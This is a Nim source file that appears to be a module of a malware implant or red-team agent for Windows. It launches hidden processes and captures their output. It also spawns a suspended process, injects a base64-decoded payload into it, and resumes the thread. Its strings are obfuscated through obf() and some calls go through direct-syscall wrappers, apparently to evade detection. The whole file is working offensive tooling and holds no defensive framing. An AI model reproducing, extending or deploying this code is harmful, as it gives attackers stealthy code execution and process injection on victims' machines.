from std/base64 import decode
import std/json
from std/strutils import strip
import ../utils/global
import ../utils/general/strings
import execution/core
from injection/core import injectPayload
from ../utils/winapi/handlers import createProcessW, createPipe, setHandleInformation, getStdHandle, closeHandle, resumeThread, getFileAttributesW
from ../utils/winapi/syscall import readFile, waitForObject, ntCloseHandle
from ../utils/winapi/utils import SECURITY_ATTRIBUTES

const
  createSuspended = 0x4'u32
  createNoWindow = 0x08000000'u32
  startfUseStdHandles = 0x100'u32
  handleFlagInherit = 1'u32
  stdInputHandle = 0xFFFFFFF6'u32
  invalidFileAttributes = 0xFFFFFFFF'u32

proc decodePayload(input: string): seq[byte] =
  # Decodes the base 64 input into raw bytes
  if input.len == 0:
    return @[]
  let raw = decode(input)
  result = newSeq[byte](raw.len)
  if raw.len > 0: copyMem(addr result[0], unsafeAddr raw[0], raw.len)

type
  ProcessInfo = object
    hProcess*, hThread*: pointer
    dwProcessId*, dwThreadId*: uint32

  StartupInfoW = object
    cb: culong
    reserved: pointer
    desktop: pointer
    title: pointer
    x, y, xSize, ySize: culong
    xCountChars, yCountChars: culong
    fillAttribute: culong
    flags: culong
    showWindow: uint16
    cbReserved2: uint16
    lpReserved2: pointer
    hStdInput, hStdOutput, hStdError: pointer

proc paramTarget(params: string): string =
  # Reads the target path from the params json
  try:
    let p = parseJson(params)
    if p.hasKey(obf("target")): p[obf("target")].getStr().strip(chars = {'"', '\''}) else: ""
  except JsonParsingError:
    ""

proc pathExists(path: string): bool =
  # Checks that the path exists on disk
  var w: array[260, uint16]
  asciiWide(path, w)
  getFileAttributesW(addr w[0]) != invalidFileAttributes

proc setupPipe(hRead, hWrite: ptr pointer): bool =
  # Creates an inherited write pipe and a private read pipe
  var sa = SECURITY_ATTRIBUTES(
    nLength: culong sizeof(SECURITY_ATTRIBUTES),
    lpSecurityDescriptor: nil,
    bInheritHandle: 1,
  )
  if createPipe(hRead, hWrite, addr sa, 1024 * 1024) == 0:
    return false
  setHandleInformation(hRead[], handleFlagInherit, 0) != 0

proc readPipe(hRead: pointer; buf: var openArray[char]): int =
  # Reads all pipe bytes into the output buffer
  var pos = 0
  var chunk: array[4096, byte]
  while pos < buf.len:
    let rd = readFile(hRead, addr chunk[0], culong(min(chunk.len, buf.len - pos)))
    if rd == 0: break
    copyMem(addr buf[pos], addr chunk[0], int(rd))
    pos += int(rd)
  pos

proc launchProcess(cmdLine: string; flags: culong; hStdOut: pointer; inherit: culong; pi: var ProcessInfo): bool =
  # Starts a process from the command line
  if cmdLine.len == 0 or cmdLine.len >= 2048: return false
  var wcmd: array[2048, uint16]
  asciiWide(cmdLine, wcmd)
  var si: StartupInfoW
  zeroMem(addr si, sizeof(si))
  si.cb = culong sizeof(StartupInfoW)
  if hStdOut != nil:
    si.flags = startfUseStdHandles
    si.hStdInput = getStdHandle(stdInputHandle)
    si.hStdOutput = hStdOut
    si.hStdError = hStdOut
  zeroMem(addr pi, sizeof(pi))
  createProcessW(nil, addr wcmd[0], nil, nil, inherit, flags, nil, nil, addr si, addr pi) != 0

proc run_spawn*(params: string; buf: var openArray[char]; suspended: bool = false): int =
  # Main function that spawns a process and captures its output
  let target = paramTarget(params)
  if target.len == 0:
    return writeErr(obf("missing target"), buf)
  if not pathExists(target):
    return writeErr(obf("target not found"), buf)

  if suspended:
    var pi: ProcessInfo
    if not launchProcess(target, createSuspended or createNoWindow, nil, 0, pi):
      return writeErr(obf("CreateProcess failed"), buf)
    let pid = pi.dwProcessId
    discard ntCloseHandle(pi.hThread)
    discard ntCloseHandle(pi.hProcess)
    return writeMsg(obf("Spawned suspended (PID ") & $pid & obf(")."), buf)

  var hRead, hWrite: pointer
  if not setupPipe(addr hRead, addr hWrite):
    return writeErr(obf("CreatePipe failed"), buf)

  var pi: ProcessInfo
  if not launchProcess(target, createNoWindow, hWrite, 1, pi):
    discard closeHandle(hWrite)
    discard closeHandle(hRead)
    return writeErr(obf("CreateProcess failed"), buf)

  discard closeHandle(hWrite)
  discard waitForObject(pi.hProcess)
  discard ntCloseHandle(pi.hThread)
  discard ntCloseHandle(pi.hProcess)
  let n = readPipe(hRead, buf)
  discard closeHandle(hRead)
  if n > 0: n
  else: writeMsg(obf("Spawned. No output."), buf)

proc run_inj_spawn*(input, params: string; buf: var openArray[char]): int =
  # Main function that spawns a suspended process and injects a payload
  let target = paramTarget(params)
  if target.len == 0:
    return writeErr(obf("missing target"), buf)
  if not pathExists(target):
    return writeErr(obf("target not found"), buf)

  let payload = decodePayload(input)
  if payload.len == 0:
    return writeErr(obf("invalid input"), buf)

  var pi: ProcessInfo
  if not launchProcess(target, createSuspended or createNoWindow, nil, 0, pi):
    return writeErr(obf("CreateProcess failed"), buf)

  let hThread = injectPayload(pi.hProcess, payload)
  if hThread == nil:
    discard ntCloseHandle(pi.hThread)
    discard ntCloseHandle(pi.hProcess)
    return writeErr(obf("injection failed"), buf)

  discard resumeThread(pi.hThread)
  discard ntCloseHandle(hThread)
  discard ntCloseHandle(pi.hThread)
  discard ntCloseHandle(pi.hProcess)
  writeMsg(obf("Injected into spawned process."), buf)
